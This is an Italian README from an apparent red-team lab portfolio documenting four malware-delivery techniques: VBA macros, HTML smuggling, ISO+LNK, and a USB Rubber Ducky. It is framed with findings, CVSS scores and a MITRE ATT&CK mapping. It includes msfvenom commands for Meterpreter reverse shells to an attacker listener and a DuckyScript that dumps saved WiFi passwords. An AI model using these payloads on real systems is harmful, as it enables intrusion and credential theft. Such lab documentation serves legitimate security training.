> [English](README.en.md) | **Italiano**

# 03 - Payload Delivery

> - **Fase:** Social Engineering - Payload Delivery (consegna codice malevolo al target)
> - **Visibilita:** Alta - i vettori di delivery interagiscono con email gateway, proxy, endpoint protection; l'esecuzione del payload triggera EDR/AV; i file allegati sono analizzati da sandbox automatiche
> - **Prerequisiti:** Payload generato (msfvenom, Empire stager, o custom); per macro VBA: Microsoft Office con macro abilitate sul target; per HTML Smuggling: conoscenza JavaScript; per ISO+LNK: tool di creazione immagini ISO; per Rubber Ducky: hardware Hak5 o emulatore
> - **Output:** Finding SE-007..010; payload eseguiti su macchina target tramite quattro vettori di delivery distinti; reverse shell o credential esfiltration ottenuta in ciascun scenario

---

## Introduzione

Il Payload Delivery e la fase della kill chain in cui il codice malevolo viene fisicamente consegnato alla vittima e ne viene ottenuta l'esecuzione. Mentre la sezione `01-phishing-campaigns` si concentra sulla raccolta di credenziali e la sezione `02-social-engineer-toolkit` fornisce il framework multi-vettore, questa sezione documenta in dettaglio le tecniche specifiche di weaponization e delivery.

L'evoluzione dei vettori di delivery riflette la corsa tra attaccanti e difensori:

1. **Macro VBA (SE-007):** la tecnica classica (pre-2022). Un documento Word/Excel con macro malevola che, una volta abilitata dall'utente, esegue uno stager PowerShell. Microsoft ha disabilitato le macro VBA di default per file con Mark-of-the-Web a partire da luglio 2022, riducendone l'efficacia ma non eliminandola in ambienti legacy.

2. **HTML Smuggling (SE-008):** tecnica moderna che bypassa i filtri email gateway. Il codice JavaScript nell'email/pagina HTML assembla il file malevolo direttamente nel browser della vittima tramite Blob API, eludendo i controlli server-side che analizzano solo allegati statici.

3. **ISO + LNK (SE-009):** la risposta degli attaccanti al blocco delle macro. I file ISO non portano il Mark-of-the-Web quando montati su Windows, e i file LNK al loro interno eseguono comandi arbitrari senza che SmartScreen intervenga. Tecnica dominante nel 2022-2024.

4. **USB Rubber Ducky (SE-010):** attacco fisico tramite dispositivo HID. Il Rubber Ducky si presenta come una tastiera e inietta sequenze di tasti pre-programmate a velocita sovraumana.

---

## Struttura della cartella

```
03-payload-delivery/
+-- malicious-macros/     # VBA macro reverse shell (tecnica classica) - SE-007
+-- html-smuggling/       # Bypass email gateway via blob JS - SE-008
+-- iso-lnk-delivery/     # Post-macro kill: MotW bypass chain - SE-009
+-- usb-rubber-ducky/     # HID attack fisico - SE-010
```

---

## `malicious-macros/` - VBA Macro Reverse Shell

**ID Finding:** `SE-007` | **Severity:** `Alto` (macro VBA esegue stager PowerShell per reverse shell)

### Contesto operativo

Il laboratorio ha documentato la creazione di un documento Word con macro VBA che, quando abilitata dall'utente, esegue uno stager PowerShell encoded per reverse shell Meterpreter. La tecnica e legacy post-2022, ma resta rilevante per ambienti Office con macro abilitate (aziende con dipendenze legacy, file provenienti da share interni senza MotW).

### Comandi principali

```Bash
# Generazione payload VBA con msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f vba-psh -o macro_payload.vba
```

---

## `html-smuggling/` - Bypass Email Gateway

**ID Finding:** `SE-008` | **Severity:** `Alto` (payload .exe ricostruito lato client, bypass filtri server-side)

### Contesto operativo

HTML Smuggling sfrutta le API JavaScript (Blob, URL.createObjectURL) per assemblare un file malevolo direttamente nel browser della vittima. L'email contiene solo codice JavaScript legittimo: il payload e codificato in Base64 all'interno dello script e viene decodificato e offerto come download quando la vittima apre la pagina. I filtri email gateway non eseguono JavaScript, rendendo questa tecnica altamente efficace.

### Comandi principali

```Bash
# Generazione payload e encoding Base64
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o update.exe
base64 -w 0 update.exe > payload_b64.txt
```

---

## `iso-lnk-delivery/` - Mark-of-the-Web Bypass

**ID Finding:** `SE-009` | **Severity:** `Critico` (esecuzione payload senza MotW, bypass SmartScreen)

### Contesto operativo

Dopo il blocco delle macro VBA (luglio 2022), gli attaccanti hanno adottato una nuova delivery chain: file ISO contenenti un LNK (shortcut) e il payload. Windows monta l'ISO come drive virtuale e i file al suo interno non ereditano il Mark-of-the-Web, il flag che attiva SmartScreen. Il LNK, con icona camuffata da documento, esegue il payload senza intervento di SmartScreen.

### Comandi principali

```Bash
# Creazione payload e immagine ISO
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o payload.exe
mkisofs -o delivery.iso -J -r ./iso_contents/
```

---

## `usb-rubber-ducky/` - HID Attack Fisico

**ID Finding:** `SE-010` | **Severity:** `Alto` (esfiltrazione credenziali WiFi in < 30 secondi)

### Contesto operativo

Il Rubber Ducky (Hak5) si presenta al sistema come una tastiera HID e inietta sequenze di tasti a velocita sovraumana. Il laboratorio ha documentato uno script DuckyScript che estrae le credenziali WiFi salvate su Windows, completando l'operazione in meno di 30 secondi.

### Comandi principali

```Bash
# DuckyScript per esfiltrazione WiFi (Windows)
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "(netsh wlan show profiles)|Select-String ':(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();$_}|%{(netsh wlan show profile name=$n key=clear)}|Out-File $env:TEMP\wifi.txt"
ENTER
```

---

## Flusso operativo consigliato

```
[1] Scelta del vettore
     +-- Target con macro abilitate? -------> Malicious Macros (SE-007)
     +-- Email gateway blocca allegati? ----> HTML Smuggling (SE-008)
     +-- Target Windows 10/11 standard? ----> ISO + LNK (SE-009)
     +-- Accesso fisico al target? ---------> USB Rubber Ducky (SE-010)
              |
              v
[2] Weaponization
     +-- msfvenom: generazione payload per il vettore scelto
     +-- Embedding: VBA macro / Base64 JS / ISO+LNK / DuckyScript
              |
              v
[3] Delivery
     +-- Email (SE-007, SE-008): invio tramite GoPhish o SET
     +-- Link (SE-009): hosting ISO su server controllato
     +-- Fisico (SE-010): inserimento USB nel target
              |
              v
[4] Execution & Callback
     +-- Handler Metasploit in ascolto
     +-- Reverse shell / credential esfiltration
```

---

## Tool di riferimento

| Tool | Tipo | Tecnica/Accesso | Caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `msfvenom` | Payload generator | CLI | Generazione payload in tutti i formati (VBA, EXE, PS1, DLL) |
| `mkisofs` / `genisoimage` | ISO creator | CLI | Creazione immagini ISO per delivery chain |
| `Rubber Ducky` | HID attack | Hardware + DuckyScript | Iniezione keystroke automatizzata via USB |
| `macro_pack` | Office weaponizer | CLI - Python | Offuscamento macro VBA e generazione documenti Office malevoli |
| `Unicorn` | PS payload generator | CLI - Python | Generazione payload PowerShell encoded per delivery |
| `Donut` | Shellcode generator | CLI | Conversione .NET assembly in shellcode position-independent |

> **Tool moderno consigliato:** `macro_pack` per offuscamento avanzato delle macro VBA (bypass AMSI). Per delivery moderna (2024-2026), la combinazione ISO+LNK sta cedendo il passo a Windows Shortcut exploitation (CVE-2024-21412) e OneNote attachments. `Donut` per conversione di qualsiasi .NET/PE in shellcode iniettabile.

---

## Registro Finding

| ID | Descrizione | Severity | CVSS | Sottocartella |
| :--- | :--- | :---: | :---: | :--- |
| `SE-007` | Macro VBA: documento Word con macro che esegue stager PowerShell encoded per reverse shell Meterpreter | `Alto` | 7.8 | `malicious-macros/` |
| `SE-008` | HTML Smuggling: payload .exe ricostruito lato client via Blob JavaScript, bypass email gateway | `Alto` | 8.1 | `html-smuggling/` |
| `SE-009` | ISO + LNK: payload eseguito senza Mark-of-the-Web, bypass SmartScreen e macro block | `Critico` | 9.1 | `iso-lnk-delivery/` |
| `SE-010` | USB Rubber Ducky: esfiltrazione credenziali WiFi salvate in < 30 secondi via HID injection | `Alto` | 7.2 | `usb-rubber-ducky/` |

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Finding Correlato |
| :--- | :--- | :--- | :--- |
| Resource Development | Develop Capabilities: Malware | `T1587.001` | SE-007, SE-008, SE-009 |
| Initial Access | Phishing: Spearphishing Attachment | `T1566.001` | SE-007, SE-008, SE-009 |
| Initial Access | Replication Through Removable Media | `T1091` | SE-010 |
| Execution | User Execution: Malicious File | `T1204.002` | SE-007, SE-009, SE-010 |
| Execution | Command and Scripting Interpreter: PowerShell | `T1059.001` | SE-007, SE-008 |
| Execution | Command and Scripting Interpreter: Visual Basic | `T1059.005` | SE-007 |
| Defense Evasion | Subvert Trust Controls: Mark-of-the-Web Bypass | `T1553.005` | SE-009 |
| Defense Evasion | Obfuscated Files or Information: HTML Smuggling | `T1027.006` | SE-008 |
| Collection | Input Capture: Credential API Hooking | `T1056.004` | SE-010 |

---

> **Nota:** Tutte le attivita documentate sono state condotte in un ambiente di laboratorio virtualizzato (VirtualBox, rete NAT/Bridge isolata). I payload sono stati eseguiti esclusivamente su macchine virtuali di proprieta dell'autore. Nessun payload e stato consegnato a sistemi o persone reali.
